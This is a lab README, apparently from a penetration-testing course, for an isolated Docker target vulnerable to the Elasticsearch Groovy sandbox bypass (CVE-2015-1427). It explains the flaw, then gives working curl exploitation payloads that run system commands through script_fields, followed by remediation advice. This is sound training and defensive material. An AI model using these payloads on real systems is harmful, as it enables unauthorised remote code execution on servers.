# Elasticsearch Groovy Dynamic Scripting Sandbox Bypass RCE (CVE-2015-1427)

## Laboratory Overview

This laboratory provides an isolated, production-grade practice target for studying **Elasticsearch Groovy Dynamic Scripting Sandbox Bypass RCE (CVE-2015-1427)**.

- **Target Directory**: `Classes/02_web_penetration_tester/22_nosql_injection/elasticsearch_groovy_cve_2015_1427`
- **Default Port(s)**: `8253:9200` (Host port 8253 mapped to container port 9200)
- **CLI Shortcut**: `./lab start elasticsearch-groovy-rce`

---

## Architecture & Service Map

- **Container Name**: `cyberlab_02_elasticsearch_groovy`
- **Image**: `vulhub/elasticsearch:1.4.2`
- **Network Mode**: Bridge (Isolated Docker network)
- **Resource Ceiling**: 1024 MB RAM limit

---

## Vulnerability Mechanics

Elasticsearch versions prior to 1.3.8 and 1.4.3 contain a critical Remote Code Execution vulnerability in the Groovy scripting engine. Following CVE-2014-3120, Elasticsearch replaced MVEL with Groovy as the default dynamic scripting language and introduced a sandbox to restrict access to sensitive system classes.

However, the Groovy sandbox implementation in Elasticsearch 1.4.0 through 1.4.2 was insufficient. Specifically, it allowed attackers to bypass the sandbox by leveraging Java reflection via exposed class objects such as `java.lang.Math.class.forName(...)` or classloader chaining to obtain references to `java.lang.Runtime` and execute arbitrary system commands.

### Technical Root Cause

The Groovy sandbox blacklist/whitelist inspection did not restrict method calls chained from class references accessible via allowed classes (such as `java.lang.Math`). When executing search queries with `script_fields`, attackers can invoke `java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec(...)` to execute commands in the context of the Elasticsearch process.

---

## Exploitation & Verification Walkthrough

### 1. Verification of Service Availability

Verify that Elasticsearch 1.4.2 is responding on host port `8253`:

```bash
curl -i http://localhost:8253/
```

Expected response status: `200 OK` with JSON displaying Elasticsearch version `1.4.2` (`"number" : "1.4.2"`).

### 2. Indexing a Prerequisite Document

Elasticsearch evaluates search scripts (`script_fields`) against matched documents. If the search returns 0 hits, the script fields will not be executed. Therefore, index at least one test document:

```bash
curl -X POST "http://localhost:8253/website/blog/" \
  -H "Content-Type: application/json" \
  -d '{
    "title": "CVE-2015-1427 Lab",
    "content": "Testing Groovy sandbox bypass"
  }'
```

Expected response: `201 Created` with `"created": true`.

### 3. Executing Commands via Groovy Reflection Sandbox Bypass

Submit a search request to the `/_search` endpoint specifying a `script_fields` payload that executes system commands (`id`):

```bash
curl -X POST "http://localhost:8253/_search?pretty" \
  -H "Content-Type: application/json" \
  -d '{
    "size": 1,
    "script_fields": {
      "command_output": {
        "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"
      }
    }
  }'
```

Alternative Groovy-native command execution payload:

```bash
curl -X POST "http://localhost:8253/_search?pretty" \
  -H "Content-Type: application/json" \
  -d '{
    "size": 1,
    "script_fields": {
      "command_output": {
        "script": "def command=\"id\";def res=command.execute().text;res"
      }
    }
  }'
```

Expected response contains the output of `id` embedded in the search hit:

```json
{
  "hits": {
    "total": 1,
    "hits": [
      {
        "_index": "website",
        "_type": "blog",
        "_id": "...",
        "fields": {
          "command_output": [
            "uid=1000(elasticsearch) gid=1000(elasticsearch) groups=1000(elasticsearch)\n"
          ]
        }
      }
    ]
  }
}
```

---

## Defensive Remediation & Hardening

1. **Disable Dynamic Scripting**:
   In legacy Elasticsearch configurations (`elasticsearch.yml`), disable dynamic Groovy scripting:
   ```yaml
   script.groovy.sandbox.enabled: false
   script.disable_dynamic: true
   ```
2. **Upgrade Elasticsearch**:
   Upgrade Elasticsearch to version 1.4.3+, 1.3.8+, or modern versions (7.x / 8.x) that utilize Painless scripting with strict compile-time type-safety and robust sandboxing.
3. **Network Boundary Protection**:
   Do not expose Elasticsearch HTTP/REST APIs directly to unauthenticated networks. Implement authentication (Elasticsearch Security / reverse proxy) and firewall ingress rules.

---

## References & Advisories

- **Vulhub Environment**: [Vulhub Elasticsearch CVE-2015-1427](https://github.com/vulhub/vulhub/tree/master/elasticsearch/CVE-2015-1427)
- **Elastic Security Advisory**: [Elasticsearch Vulnerability CVE-2015-1427](https://www.elastic.co/community/security)
- **NVD CVE Details**: [CVE-2015-1427 Detail](https://nvd.nist.gov/vuln/detail/CVE-2015-1427)
- **Jordan Wright Research**: [Elasticsearch RCE Vulnerability (CVE-2015-1427)](http://jordan-wright.com/blog/2015/03/08/elasticsearch-rce-vulnerability-cve-2015-1427/)
- **Verified Video Walkthrough**: [SomeDayPWN: CVE-2015-1427 Proof of Concept](https://www.youtube.com/watch?v=VckaMBA3XRw)
